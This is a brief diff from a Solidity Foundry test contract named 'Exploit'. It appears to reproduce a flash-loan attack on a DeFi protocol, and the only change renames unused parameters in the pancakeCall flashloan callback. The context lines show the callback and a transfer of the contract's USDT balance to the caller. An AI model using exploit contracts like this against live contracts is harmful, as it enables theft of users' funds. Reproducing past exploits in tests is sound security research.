@@ -90,7 +90,7 @@ contract Exploit is Test {
         IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this)));
     }
 
-    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+    function pancakeCall(address, uint256, uint256 amount1, bytes calldata data) public {
         if (keccak256(data) == keccak256("0000")) {
             console.log("Flashloan[1] : Received");
 
